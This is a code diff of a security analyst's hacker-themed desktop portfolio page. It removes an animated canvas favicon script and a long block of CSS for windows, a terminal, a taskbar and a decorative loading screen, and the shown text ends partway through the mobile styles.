@@ -4,812 +4,36 @@
 <meta charset="UTF-8"/>
 <title>Ankesh Prajapati | CyberSec Desktop</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Ankesh Prajapati — Security Analyst & Penetration Tester at Securis360. Interactive cyber-desktop portfolio."/>
 <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
-<!-- Animated Favicon -->
 <link id="favicon" rel="icon" type="image/png" href=""/>
-<script>
-(function(){
-  var canvas = document.createElement('canvas');
-  canvas.width = 32; canvas.height = 32;
-  var ctx = canvas.getContext('2d');
-  var favicon = null;
-  var frame = 0;
-  var glitchTimer = 0;
-  var glitching = false;
 
-  // Matrix rain drops for favicon
-  var drops = [];
-  var chars = '01アイウエオカキ<>{}[]#$%@!';
-  for(var i=0;i<4;i++) drops.push({x:i*8+4, y:Math.random()*32, speed:1+Math.random()*1.5, char:chars[Math.floor(Math.random()*chars.length)]});
-
-  function drawFavicon(){
-    ctx.clearRect(0,0,32,32);
-
-    // Background
-    ctx.fillStyle = '#0d1117';
-    ctx.fillRect(0,0,32,32);
-
-    // Glitch effect trigger
-    glitchTimer++;
-    if(glitchTimer > 60 && Math.random() < 0.03){ glitching = true; glitchTimer = 0; }
-    if(glitching && Math.random() < 0.3) glitching = false;
-
-    // Animated border glow (pulsing)
-    var pulse = 0.4 + 0.6 * Math.abs(Math.sin(frame * 0.05));
-    ctx.strokeStyle = 'rgba(0,255,157,' + pulse + ')';
-    ctx.lineWidth = 1.5;
-    ctx.strokeRect(1, 1, 30, 30);
-
-    // Corner brackets
-    ctx.strokeStyle = '#00ff9d';
-    ctx.lineWidth = 2;
-    var s = 6;
-    // TL
-    ctx.beginPath(); ctx.moveTo(2,2+s); ctx.lineTo(2,2); ctx.lineTo(2+s,2); ctx.stroke();
-    // TR
-    ctx.beginPath(); ctx.moveTo(30-s,2); ctx.lineTo(30,2); ctx.lineTo(30,2+s); ctx.stroke();
-    // BL
-    ctx.beginPath(); ctx.moveTo(2,30-s); ctx.lineTo(2,30); ctx.lineTo(2+s,30); ctx.stroke();
-    // BR
-    ctx.beginPath(); ctx.moveTo(30-s,30); ctx.lineTo(30,30); ctx.lineTo(30,30-s); ctx.stroke();
-
-    // Matrix rain columns
-    drops.forEach(function(d){
-      var alpha = glitching ? Math.random() : (0.3 + 0.7*(1-(d.y/32)));
-      ctx.fillStyle = 'rgba(0,255,157,'+alpha+')';
-      ctx.font = 'bold 7px monospace';
-      if(Math.random() < 0.1) d.char = chars[Math.floor(Math.random()*chars.length)];
-      ctx.fillText(d.char, d.x-3, d.y);
-      d.y += d.speed;
-      if(d.y > 34){ d.y = -4; d.char = chars[Math.floor(Math.random()*chars.length)]; }
-    });
-
-    // Center shield/lock icon
-    ctx.fillStyle = glitching ? '#ff3355' : '#00ff9d';
-    ctx.font = 'bold 13px monospace';
-    ctx.textAlign = 'center';
-    ctx.textBaseline = 'middle';
-    // Glitch offset
-    var gx = glitching ? (Math.random()*4-2) : 0;
-    var gy = glitching ? (Math.random()*4-2) : 0;
-    ctx.fillText('🔒', 16+gx, 16+gy);
-
-    // Scan line sweep
-    var scanY = (frame * 0.8) % 32;
-    ctx.fillStyle = 'rgba(0,255,157,0.12)';
-    ctx.fillRect(0, scanY, 32, 2);
-
-    frame++;
-    favicon = document.getElementById('favicon');
-    if(favicon) favicon.href = canvas.toDataURL('image/png');
-    requestAnimationFrame(drawFavicon);
-  }
-  window.addEventListener('DOMContentLoaded', drawFavicon);
-})();
-</script>
-<style>
-:root {
-  --bg: #0d1117;
-  --taskbar: #161b22;
-  --panel: #0d1117;
-  --panel-header: #161b22;
-  --border: #30363d;
-  --accent: #00ff9d;
-  --accent2: #39ff14;
-  --accent-rgb: 0,255,157;
-  --red: #ff5f57;
-  --amber: #febc2e;
-  --green: #28c840;
-  --text: #c9d1d9;
-  --muted: #6e7681;
-  --highlight: #58a6ff;
-  --danger: #ff3355;
-  --window-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 0 1px rgba(var(--accent-rgb),0.25);
-}
-*{margin:0;padding:0;box-sizing:border-box;}
-html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospace;background:var(--bg);color:var(--text);}
-
-/* Matrix canvas */
-/* animated bg canvas */
-
-/* Desktop */
-#desktop{position:fixed;inset:0 0 44px 0;background:#0d1117;overflow:hidden;z-index:1;}
-#desktopBg{position:absolute;inset:0;width:100%;height:100%;z-index:0;pointer-events:none;display:block;}
-
-/* Icon column scrollbar hidden but functional */
-.desktop-icons::-webkit-scrollbar{display:none;}
-.desktop-icons{scrollbar-width:none;-ms-overflow-style:none;}
-
-/* Scanline effect */
-#desktop::after{
-  content:"";position:absolute;inset:0;
-  background:repeating-linear-gradient(0deg,rgba(0,0,0,0.15),rgba(0,0,0,0.15) 1px,transparent 2px,transparent 4px);
-  pointer-events:none;z-index:0;
-}
-
-/* Desktop icons */
-.desktop-icons{
-  position:fixed;
-  top:8px; right:8px; bottom:52px; left:auto;
-  width:76px;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:flex-start;
-  gap:0px;
-  padding:2px 0;
-  z-index:2;
-  pointer-events:none;
-  overflow-y:auto;
-  overflow-x:hidden;
-}
-.icon{
-  display:flex;flex-direction:column;align-items:center;gap:1px;
-  padding:4px 3px;border-radius:7px;cursor:pointer;
-  transition:background 0.2s,transform 0.15s;
-  width:72px;user-select:none;pointer-events:all;
-  flex-shrink:0;
-}
-.icon:hover{background:rgba(var(--accent-rgb),0.13);transform:scale(1.06);}
-.icon:active{background:rgba(var(--accent-rgb),0.22);transform:scale(0.97);}
-.icon-img{
-  font-size:1.5rem;
-  filter:drop-shadow(0 0 6px var(--accent));
-  line-height:1;
-}
-.icon-label{
-  font-size:0.58rem;color:#e0f0ea;text-align:center;
-  text-shadow:0 1px 6px #000,0 0 12px #000;
-  word-break:break-word;line-height:1.2;
-  max-width:68px;
-}
-
-/* Taskbar */
-#taskbar{
-  position:fixed;bottom:0;left:0;right:0;height:44px;
-  background:rgba(22,27,34,0.95);
-  border-top:1px solid var(--border);
-  backdrop-filter:blur(20px);
-  display:flex;align-items:center;gap:8px;
-  padding:0 12px;z-index:9999;
-}
-.taskbar-start{
-  padding:4px 12px;border-radius:6px;
-  background:rgba(var(--accent-rgb),0.1);border:1px solid rgba(var(--accent-rgb),0.3);
-  color:var(--accent);font-size:0.78rem;cursor:pointer;
-  font-family:inherit;transition:all 0.2s;white-space:nowrap;
-}
-.taskbar-start:hover{background:rgba(var(--accent-rgb),0.2);}
-.taskbar-sep{width:1px;height:24px;background:var(--border);}
-.taskbar-tasks{display:flex;gap:4px;flex:1;overflow-x:auto;}
-.taskbar-task{
-  padding:3px 10px;border-radius:4px;font-size:0.72rem;
-  border:1px solid transparent;cursor:pointer;white-space:nowrap;
-  font-family:inherit;transition:all 0.2s;color:var(--muted);background:transparent;
-}
-.taskbar-task:hover{background:rgba(255,255,255,0.05);color:var(--text);}
-.taskbar-task.active{background:rgba(var(--accent-rgb),0.1);border-color:rgba(var(--accent-rgb),0.3);color:var(--accent);}
-.taskbar-clock{
-  font-size:0.75rem;color:var(--muted);white-space:nowrap;
-  padding:0 8px;border-left:1px solid var(--border);
-}
-.taskbar-tray{display:flex;align-items:center;gap:6px;padding-left:8px;border-left:1px solid var(--border);}
-.tray-icon{display:flex;align-items:center;cursor:pointer;opacity:0.55;transition:opacity 0.2s;color:var(--text);}
-.tray-icon:hover{opacity:1;color:var(--accent);}
-.tray-icon svg{display:block;}
-
-/* Windows */
-.window{
-  position:absolute;
-  background:var(--panel);
-  border:1px solid var(--border);
-  border-radius:10px;
-  box-shadow:var(--window-shadow);
-  display:flex;flex-direction:column;
-  min-width:300px;min-height:200px;
-  z-index:10;
-  transition:opacity 0.15s,transform 0.15s;
-  overflow:hidden;
-  min-height:0;
-}
-.window.minimized{opacity:0;transform:scale(0.85) translateY(20px);pointer-events:none;}
-.window.maximized{
-  top:0!important;left:0!important;
-  width:100%!important;height:calc(100vh - 44px)!important;
-  border-radius:0;
-  display:flex!important;
-  flex-direction:column;
-}
-.window.focused{z-index:100;border-color:rgba(var(--accent-rgb),0.4);}
-
-/* Window title bar */
-.win-titlebar{
-  display:flex;align-items:center;gap:8px;
-  padding:8px 12px;
-  background:var(--panel-header);
-  border-bottom:1px solid var(--border);
-  cursor:grab;user-select:none;flex-shrink:0;
-}
-.win-titlebar:active{cursor:grabbing;}
-.win-dots{display:flex;gap:6px;align-items:center;}
-.win-dot{
-  width:14px;height:14px;border-radius:50%;cursor:pointer;
-  transition:all 0.15s;flex-shrink:0;
-  display:flex;align-items:center;justify-content:center;
-  font-size:9px;font-weight:700;color:transparent;
-  line-height:1;user-select:none;
-  box-shadow:inset 0 0 0 1px rgba(0,0,0,0.25);
-}
-.win-dot:hover{color:rgba(0,0,0,0.75);filter:brightness(1.1);}
-.win-dot.close{background:var(--red);}
-.win-dot.close::after{content:"✕";}
-.win-dot.minimize{background:var(--amber);}
-.win-dot.minimize::after{content:"−";}
-.win-dot.maximize{background:var(--green);}
-.win-dot.maximize::after{content:"+";}
-.window:not(.focused) .win-dot{opacity:0.5;}
-.window:not(.focused) .win-dot:hover{opacity:1;}
-.win-title{font-size:0.75rem;color:var(--muted);margin-left:4px;flex:1;text-align:center;}
-.win-title-right{width:54px;} /* balance */
-
-/* Window body */
-.win-body{flex:1;overflow:hidden;display:flex;flex-direction:column;min-height:0;}
-.win-content{flex:1;overflow-y:auto;padding:16px;min-height:0;}
-.win-content::-webkit-scrollbar{width:5px;}
-.win-content::-webkit-scrollbar-thumb{background:rgba(var(--accent-rgb),0.3);border-radius:3px;}
-
-/* Resize handle */
-.win-resize{
-  position:absolute;right:0;bottom:0;width:16px;height:16px;
-  cursor:se-resize;z-index:5;
-  background:linear-gradient(135deg,transparent 50%,rgba(var(--accent-rgb),0.3) 50%);
-  border-radius:0 0 10px 0;
-}
-
-/* ============ PANEL SECTIONS ============ */
-.section-title{
-  font-size:0.7rem;color:var(--muted);
-  text-transform:uppercase;letter-spacing:0.1em;
-  margin-bottom:12px;border-bottom:1px solid var(--border);
-  padding-bottom:6px;
-}
-.section-title span{color:var(--accent);}
-
-/* About */
-.about-header{
-  display:flex;gap:16px;align-items:flex-start;margin-bottom:16px;
-}
-.avatar{
-  width:70px;height:70px;border-radius:50%;flex-shrink:0;
-  background:radial-gradient(circle at 40% 35%,#1a3a2a,#050f08);
-  border:2px solid var(--accent);
-  display:flex;align-items:center;justify-content:center;
-  font-size:2rem;box-shadow:0 0 20px rgba(var(--accent-rgb),0.3);
-}
-.about-name{font-size:1.1rem;color:var(--accent);font-weight:600;margin-bottom:4px;}
-.about-role{font-size:0.8rem;color:var(--text);}
-.about-badge{
-  display:inline-block;margin-top:6px;padding:2px 8px;
-  border-radius:999px;border:1px solid rgba(var(--accent-rgb),0.4);
-  font-size:0.68rem;color:var(--accent);background:rgba(var(--accent-rgb),0.05);
-}
-.about-bio{font-size:0.82rem;color:var(--text);line-height:1.7;margin-bottom:12px;}
-.about-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px;}
-.stat-box{
-  background:rgba(var(--accent-rgb),0.04);border:1px solid var(--border);
-  border-radius:6px;padding:10px 8px;text-align:center;
-}
-.stat-num{font-size:1.1rem;color:var(--accent);font-weight:600;}
-.stat-label{font-size:0.65rem;color:var(--muted);margin-top:2px;}
-
-/* Skills */
-.skill-group{margin-bottom:14px;}
-.skill-group-title{font-size:0.72rem;color:var(--accent);margin-bottom:8px;opacity:0.8;}
-.skill-item{margin-bottom:6px;}
-.skill-name{font-size:0.76rem;color:var(--text);margin-bottom:3px;display:flex;justify-content:space-between;}
-.skill-name span{color:var(--muted);}
-.skill-bar{height:4px;background:rgba(255,255,255,0.05);border-radius:2px;overflow:hidden;}
-.skill-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--accent),var(--accent));transition:width 1s ease;}
-.chips{display:flex;flex-wrap:wrap;gap:5px;margin-top:4px;}
-.chip{
-  padding:2px 8px;border-radius:4px;font-size:0.68rem;
-  border:1px solid rgba(0,255,157,0.25);color:var(--text);
-  background:rgba(0,0,0,0.3);
-}
-
-/* Experience */
-.timeline{position:relative;padding-left:16px;}
-.timeline::before{content:"";position:absolute;left:4px;top:0;bottom:0;width:1px;background:rgba(var(--accent-rgb),0.2);}
-.timeline-item{position:relative;margin-bottom:16px;}
-.timeline-dot{
-  position:absolute;left:-16px;top:4px;width:8px;height:8px;
-  border-radius:50%;background:var(--accent);border:2px solid var(--panel);
-  box-shadow:0 0 8px var(--accent);
-}
-.timeline-date{font-size:0.68rem;color:var(--muted);margin-bottom:3px;}
-.timeline-role{font-size:0.82rem;color:var(--accent);font-weight:500;}
-.timeline-company{font-size:0.72rem;color:var(--text);margin-bottom:5px;}
-.timeline-desc{font-size:0.74rem;color:var(--muted);line-height:1.6;}
-
-/* Projects */
-.projects-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
-.project-card{
-  background:rgba(0,0,0,0.3);border:1px solid var(--border);
-  border-radius:8px;padding:12px;
-  transition:border-color 0.2s,transform 0.2s;cursor:pointer;
-}
-.project-card:hover{border-color:rgba(var(--accent-rgb),0.4);transform:translateY(-2px);}
-.project-icon{font-size:1.4rem;margin-bottom:8px;}
-.project-name{font-size:0.82rem;color:var(--accent);margin-bottom:5px;font-weight:500;}
-.project-desc{font-size:0.72rem;color:var(--muted);line-height:1.6;}
-.project-tags{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px;}
-.project-tag{padding:1px 6px;border-radius:3px;font-size:0.62rem;background:rgba(var(--accent-rgb),0.08);color:var(--accent);border:1px solid rgba(var(--accent-rgb),0.15);}
-
-/* Certs */
-.cert-item{
-  display:flex;align-items:center;gap:10px;
-  padding:8px 10px;border-radius:6px;margin-bottom:6px;
-  background:rgba(0,0,0,0.2);border:1px solid var(--border);
-  font-size:0.76rem;
-}
-.cert-icon{font-size:1.1rem;flex-shrink:0;}
-.cert-name{color:var(--text);flex:1;}
-.cert-org{font-size:0.66rem;color:var(--muted);}
-
-/* Contact */
-.contact-list{display:flex;flex-direction:column;gap:10px;}
-.contact-item{
-  display:flex;align-items:center;gap:12px;
-  padding:10px 12px;border-radius:8px;
-  background:rgba(0,0,0,0.2);border:1px solid var(--border);
-  font-size:0.8rem;transition:border-color 0.2s;
-}
-.contact-item:hover{border-color:rgba(var(--accent-rgb),0.3);}
-.contact-icon{font-size:1.2rem;flex-shrink:0;}
-.contact-label{font-size:0.65rem;color:var(--muted);}
-.contact-val{color:var(--accent);}
-.contact-val a{color:inherit;text-decoration:none;}
-.contact-val a:hover{text-decoration:underline;}
-
-.terminal-body{
-  background:#0d1117;flex:1;min-height:0;overflow:hidden;
-  font-size:0.82rem;line-height:1.35;
-  font-family:'Fira Code','JetBrains Mono',monospace;
-  position:relative;cursor:text;
-}
-.term-scroll{
-  position:absolute;inset:0;
-  overflow-y:auto;overflow-x:hidden;
-  padding:8px 12px 8px;
-  white-space:normal;
-  word-break:break-word;
-}
-.term-scroll::-webkit-scrollbar{width:3px;}
-.term-scroll::-webkit-scrollbar-thumb{background:rgba(var(--accent-rgb),0.2);border-radius:2px;}
-/* Every output line — no extra margin, no min-height */
-.term-line{
-  display:block;
-  margin:0;padding:0;
-  color:#c9d1d9;
-  white-space:pre-wrap;
-  word-break:break-word;
-  line-height:1.35;
-}
-/* Empty lines (blank output) still take up one line height */
-.term-line:empty::before{content:'\A';white-space:pre;}
-/* Active prompt line */
-.term-prompt-line{
-  display:block;
-  margin:0;padding:0;
-  line-height:1.35;
-  white-space:pre-wrap;
-  word-break:break-word;
-}
-.term-ps1-u{color:var(--accent);}
-.term-ps1-at,.term-ps1-p{color:#6e7681;}
-.term-ps1-h{color:var(--highlight);}
-.term-typed-span{color:#c9d1d9;}
-.term-cursor{
-  display:inline-block;
-  width:0.52em;height:0.85em;
-  background:var(--accent);
-  vertical-align:text-bottom;
-  animation:tblink 1.1s step-end infinite;
-}
-@keyframes tblink{0%,100%{opacity:1}50%{opacity:0}}
-.term-capture{
-  position:absolute;inset:0;opacity:0.001;
-  resize:none;border:none;outline:none;
-  background:transparent;color:transparent;
-  caret-color:transparent;font-size:16px;
-  z-index:5;cursor:text;overflow:hidden;
-  padding:0;margin:0;
-}
-.t-green{color:var(--accent);}
-.t-red{color:var(--danger);}
-.t-blue{color:var(--highlight);}
-.t-muted{color:var(--muted);}
-.t-yellow{color:var(--amber);}
-
-/* Neofetch window */
-.neofetch-body{
-  background:#000;padding:14px 18px;font-size:0.76rem;
-  display:flex;gap:20px;align-items:flex-start;
-  flex:1;min-height:0;overflow-y:auto;
-}
-.neofetch-logo{color:var(--accent);white-space:pre;line-height:1.35;font-size:0.67rem;flex-shrink:0;}
-.neofetch-info{color:var(--text);line-height:1.85;flex:1;}
-.nf-key{color:var(--accent);}
-.nf-val{color:var(--text);}
-
-/* ═══ HACKING LOADING SCREEN ═══ */
-#loadingScreen{
-  position:fixed;inset:0;background:#000;z-index:99999;
-  display:flex;align-items:center;justify-content:center;
-  font-family:"Fira Code",monospace;overflow:hidden;
-  transition:opacity 0.85s ease;
-}
-#hackCanvas{position:absolute;inset:0;width:100%;height:100%;}
-/* Phase wrapper */
-.hk-phase{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;gap:20px;width:100%;max-width:640px;padding:24px;}
-/* Target acquisition box */
-.hk-box{
-  position:relative;width:340px;height:122px;
-  border:1px solid rgba(var(--accent-rgb),0.2);
-  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;
-}
-.hk-c{position:absolute;width:12px;height:12px;border-color:#00ff9d;border-style:solid;}
-.hk-c.tl{top:-1px;left:-1px;border-width:2px 0 0 2px;}
-.hk-c.tr{top:-1px;right:-1px;border-width:2px 2px 0 0;}
-.hk-c.bl{bottom:-1px;left:-1px;border-width:0 0 2px 2px;}
-.hk-c.br{bottom:-1px;right:-1px;border-width:0 2px 2px 0;}
-.hk-sweep{
-  position:absolute;left:0;right:0;height:2px;top:0;
-  background:linear-gradient(90deg,transparent 0%,#00ff9d 50%,transparent 100%);
-  box-shadow:0 0 8px #00ff9d;
-  animation:hkSweep 1.8s linear infinite;
-}
-@keyframes hkSweep{0%{top:0;opacity:0;}5%{opacity:1;}95%{opacity:1;}100%{top:100%;opacity:0;}}
-.hk-label{font-size:0.58rem;color:#00ff9d;letter-spacing:0.2em;opacity:0.6;margin-bottom:2px;}
-.hk-ip{
-  font-size:1.65rem;font-weight:700;color:#00ff9d;letter-spacing:0.05em;
-  text-shadow:0 0 16px rgba(0,255,157,0.9);font-variant-numeric:tabular-nums;
-}
-.hk-host{font-size:0.68rem;color:#6e7681;}
-/* Log stream */
-.hk-log{
-  width:100%;height:148px;overflow:hidden;position:relative;
-  border:1px solid rgba(var(--accent-rgb),0.1);background:rgba(0,15,8,0.5);
-  padding:8px 12px;font-size:0.7rem;line-height:1.8;
-}
-.hk-log::after{
-  content:"";position:absolute;bottom:0;left:0;right:0;height:40px;
-  background:linear-gradient(transparent,#000);
-}
-.hkln{animation:hkLnIn 0.12s ease forwards;opacity:0;}
-@keyframes hkLnIn{to{opacity:1;}}
-/* Progress */
-.hk-prog{width:100%;display:flex;flex-direction:column;gap:5px;}
-.hk-prog-title{font-size:0.58rem;color:#00ff9d;letter-spacing:0.16em;opacity:0.5;}
-.hk-track{height:5px;width:100%;background:rgba(var(--accent-rgb),0.06);border:1px solid rgba(var(--accent-rgb),0.15);border-radius:3px;overflow:hidden;}
-.hk-fill{height:100%;width:0%;background:linear-gradient(90deg,#00ff9d,#00c8ff);border-radius:3px;box-shadow:0 0 6px rgba(var(--accent-rgb),0.5);transition:width 0.3s ease;}
-.hk-pct{font-size:0.66rem;color:#00ff9d;text-align:right;}
-/* Phase 2: ACCESS GRANTED */
-#hkPhase2{display:none;flex-direction:column;align-items:center;gap:8px;position:relative;z-index:2;}
-.ag-ring{
-  position:absolute;border-radius:50%;border:1px solid #00ff9d;
-  top:50%;left:50%;transform:translate(-50%,-50%);
-  animation:agPulse 2s ease-out infinite;
-}
-.ag-ring:nth-child(1){width:120px;height:120px;}
-.ag-ring:nth-child(2){width:180px;height:180px;animation-delay:0.3s;opacity:0.5;}
-.ag-ring:nth-child(3){width:240px;height:240px;animation-delay:0.6s;opacity:0.25;}
-@keyframes agPulse{0%{transform:translate(-50%,-50%) scale(0.7);opacity:0;}35%{opacity:1;}100%{transform:translate(-50%,-50%) scale(1.4);opacity:0;}}
-.ag-check{font-size:3rem;color:#00ff9d;text-shadow:0 0 40px #00ff9d;animation:agPop 0.4s ease-out;margin-bottom:8px;}
-@keyframes agPop{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}
-.ag-title{font-size:1.9rem;font-weight:700;letter-spacing:0.22em;color:#00ff9d;text-shadow:0 0 24px rgba(0,255,157,0.85);min-height:2.3rem;}
-.ag-who{font-size:0.76rem;color:#c9d1d9;letter-spacing:0.1em;margin-top:6px;}
-.ag-role{font-size:0.63rem;color:#6e7681;letter-spacing:0.06em;}
-.ag-wait{font-size:0.68rem;color:#00ff9d;margin-top:18px;opacity:0.6;}
-.ag-dots::after{content:"";animation:agDt 1.2s steps(4,end) infinite;}
-@keyframes agDt{0%{content:"";}25%{content:".";}50%{content:"..";}75%{content:"...";}100%{content:"";}}
-
-/* Alert overlay (Konami) */
-.alert-overlay{
-  position:fixed;inset:0;
-  background:radial-gradient(circle at center,rgba(255,30,60,0.7),rgba(0,0,0,0.97));
-  z-index:99998;display:none;align-items:center;justify-content:center;
-  flex-direction:column;color:#ffeaea;text-align:center;font-family:"Fira Code",monospace;
-}
-.alert-overlay.show{display:flex;animation:alertPulse 0.9s infinite,glitchShift 0.3s infinite;}
-@keyframes alertPulse{0%,100%{box-shadow:0 0 40px rgba(255,0,0,0.6);}50%{box-shadow:0 0 100px rgba(255,0,0,1);}}
-@keyframes glitchShift{0%{transform:translate(1px,-1px);}50%{transform:translate(-1px,1px);}100%{transform:translate(0,0);}}
-.alert-title{font-size:2rem;letter-spacing:0.2em;margin-bottom:10px;}
-.alert-sub{font-size:1rem;}
-
-/* Wallpaper picker */
-/* ── THEME CUSTOMIZER ── */
-.theme-section{margin-bottom:20px;}
-.theme-section-title{font-size:0.62rem;color:var(--muted);letter-spacing:0.14em;text-transform:uppercase;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid var(--border);}
-.preset-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;}
-.preset-btn{
-  border-radius:8px;border:2px solid transparent;cursor:pointer;
-  padding:10px 6px 8px;display:flex;flex-direction:column;align-items:center;gap:6px;
-  background:rgba(255,255,255,0.03);transition:all 0.18s;
-}
-.preset-btn:hover{background:rgba(255,255,255,0.07);transform:translateY(-1px);}
-.preset-btn.active{border-color:var(--accent);background:rgba(var(--accent-rgb),0.05);}
-.preset-swatch{width:28px;height:28px;border-radius:50%;box-shadow:0 0 10px currentColor;}
-.preset-name{font-size:0.58rem;color:var(--muted);text-align:center;}
-.color-wheel-wrap{
-  display:flex;gap:20px;align-items:flex-start;
-}
-.wheel-canvas-wrap{position:relative;flex-shrink:0;}
-#themeWheel{border-radius:50%;cursor:crosshair;display:block;}
-#wheelCursor{
-  position:absolute;width:12px;height:12px;border-radius:50%;
-  border:2px solid #fff;pointer-events:none;
-  transform:translate(-50%,-50%);box-shadow:0 0 4px rgba(0,0,0,0.8);
-  transition:left 0.1s,top 0.1s;
-}
-.wheel-controls{flex:1;display:flex;flex-direction:column;gap:12px;}
-.slider-row{display:flex;flex-direction:column;gap:4px;}
-.slider-label{font-size:0.62rem;color:var(--muted);display:flex;justify-content:space-between;}
-.slider-label span{color:var(--text);}
-.theme-slider{
-  -webkit-appearance:none;appearance:none;
-  width:100%;height:4px;border-radius:2px;outline:none;cursor:pointer;
-  background:rgba(255,255,255,0.1);
-}
-.theme-slider::-webkit-slider-thumb{
-  -webkit-appearance:none;width:14px;height:14px;border-radius:50%;
-  background:var(--accent);cursor:pointer;border:2px solid #000;
-  box-shadow:0 0 6px var(--accent);
-}
-.color-preview-wrap{display:flex;gap:10px;align-items:center;margin-top:4px;}
-.color-hex-input{
-  flex:1;background:rgba(255,255,255,0.05);border:1px solid var(--border);
-  border-radius:6px;padding:6px 10px;font-family:inherit;font-size:0.8rem;
-  color:var(--text);outline:none;
-}
-.color-hex-input:focus{border-color:var(--accent);}
-.color-preview-swatch{width:32px;height:32px;border-radius:6px;border:1px solid var(--border);flex-shrink:0;}
-.apply-theme-btn{
-  width:100%;padding:9px;border-radius:8px;border:none;cursor:pointer;
-  background:var(--accent);color:#000;font-family:inherit;font-size:0.78rem;
-  font-weight:700;letter-spacing:0.06em;transition:opacity 0.15s,transform 0.1s;
-}
-.apply-theme-btn:hover{opacity:0.88;transform:translateY(-1px);}
-.apply-theme-btn:active{transform:none;}
-
-/* Context menu */
-#ctxMenu{
-  position:fixed;display:none;
-  background:var(--panel-header);border:1px solid var(--border);
-  border-radius:8px;padding:4px;z-index:99990;
-  box-shadow:0 10px 30px rgba(0,0,0,0.8);min-width:160px;
-}
-.ctx-item{
-  padding:6px 14px;border-radius:4px;font-size:0.78rem;
-  cursor:pointer;color:var(--text);
-}
-.ctx-item:hover{background:rgba(var(--accent-rgb),0.1);color:var(--accent);}
-.ctx-sep{height:1px;background:var(--border);margin:3px 6px;}
-
-/* Start Menu */
-#startMenu{
-  position:fixed;bottom:50px;left:8px;
-  display:none;flex-direction:column;
-  background:rgba(13,17,22,0.97);
-  border:1px solid var(--border);border-radius:10px;
-  padding:0 0 6px 0;z-index:99990;
-  box-shadow:0 -4px 40px rgba(0,0,0,0.9),0 0 0 1px rgba(var(--accent-rgb),0.08);
-  min-width:240px;backdrop-filter:blur(20px);
-  animation:smIn 0.15s ease;
-}
-@keyframes smIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:none;}}
-.sm-header{
-  display:flex;align-items:center;gap:12px;
-  padding:14px 16px 12px;
-  border-bottom:1px solid var(--border);
-}
-.sm-avatar{font-size:1.8rem;line-height:1;}
-.sm-name{font-size:0.85rem;color:var(--accent);font-weight:600;}
-.sm-role{font-size:0.65rem;color:var(--muted);margin-top:1px;}
-.sm-section{
-  font-size:0.58rem;color:var(--muted);letter-spacing:0.14em;
-  padding:10px 16px 4px;text-transform:uppercase;
-}
-.sm-sep{height:1px;background:var(--border);margin:4px 10px;}
-.sm-item{
-  display:flex;align-items:center;gap:10px;
-  padding:7px 16px;cursor:pointer;font-size:0.8rem;
-  color:var(--text);transition:background 0.15s;border-radius:4px;margin:0 4px;
-}
-.sm-item:hover{background:rgba(var(--accent-rgb),0.08);color:var(--accent);}
-.sm-item span{flex:1;font-family:"Fira Code",monospace;}
-.sm-item em{font-size:0.62rem;color:var(--muted);font-style:normal;white-space:nowrap;}
-.sm-item:hover em{color:rgba(var(--accent-rgb),0.5);}
-.sm-danger{color:var(--danger)!important;}
-.sm-danger:hover{background:rgba(255,51,85,0.08)!important;color:var(--danger)!important;}
-
-/* Notification */
-.notif{
-  position:fixed;right:16px;bottom:60px;
-  background:var(--panel-header);border:1px solid rgba(var(--accent-rgb),0.3);
-  border-radius:8px;padding:10px 14px;
-  font-size:0.76rem;color:var(--text);
-  box-shadow:0 8px 30px rgba(0,0,0,0.6);
-  z-index:99997;max-width:280px;
-  animation:slideInNotif 0.3s ease;
-}
-.notif-title{color:var(--accent);font-size:0.72rem;margin-bottom:4px;}
-@keyframes slideInNotif{from{transform:translateX(20px);opacity:0;}to{transform:translateX(0);opacity:1;}}
-
-
-/* ── CUSTOM CURSOR ── */
-*, *::before, *::after { cursor: none !important; }
-
-#customCursor {
-  position: fixed;
-  pointer-events: none;
-  z-index: 999999;
-  top: 0; left: 0;
-  transform: translate(-50%, -50%);
-}
-/* Outer ring */
-#cursorRing {
-  position: fixed;
-  width: 28px; height: 28px;
-  border: 1.5px solid rgba(0,255,157,0.6);
-  border-radius: 50%;
-  pointer-events: none;
-  z-index: 999998;
-  top: 0; left: 0;
-  transform: translate(-50%, -50%);
-  transition: width 0.15s, height 0.15s, border-color 0.15s, opacity 0.15s;
-}
-#customCursor.clicking #cursorRing,
-body.cursor-click #cursorRing {
-  width: 16px; height: 16px;
-  border-color: rgba(0,255,157,1);
-}
-body.cursor-hover #cursorRing {
-  width: 40px; height: 40px;
-  border-color: rgba(0,255,157,0.9);
-}
-
-/* Tooltip */
-[data-tip]{position:relative;}
-[data-tip]:hover::after{
-  content:attr(data-tip);position:absolute;bottom:110%;left:50%;transform:translateX(-50%);
-  background:#111;border:1px solid var(--border);color:var(--text);
-  font-size:0.65rem;padding:3px 7px;border-radius:4px;white-space:nowrap;pointer-events:none;z-index:9999;
-}
-
-/* Blink cursor */
-@keyframes blink{0%,49%{opacity:1;}50%,100%{opacity:0;}}
-.blink{animation:blink 1s steps(1) infinite;}
-
-/* Scrollbar global */
-::-webkit-scrollbar{width:5px;}
-::-webkit-scrollbar-thumb{background:rgba(var(--accent-rgb),0.2);border-radius:3px;}
-
-/* ── MOBILE RESPONSIVE ── */
-@media (max-width: 768px) {
-  /* All windows fullscreen */
-  .window{
-    position:fixed!important;
-    left:0!important;top:0!important;
-    width:100vw!important;
-    height:calc(100vh - 108px)!important;
-    border-radius:0!important;
-    max-width:100vw!important;
-  }
-  .win-resize{display:none!important;}
-
-  /* Mobile: horizontal scrollable icon dock above taskbar */
-  #desktopIcons{
-    position:fixed!important;
-    left:0!important;right:0!important;
-    bottom:44px!important;top:auto!important;
-    width:100vw!important;height:68px!important;
-    flex-direction:row!important;
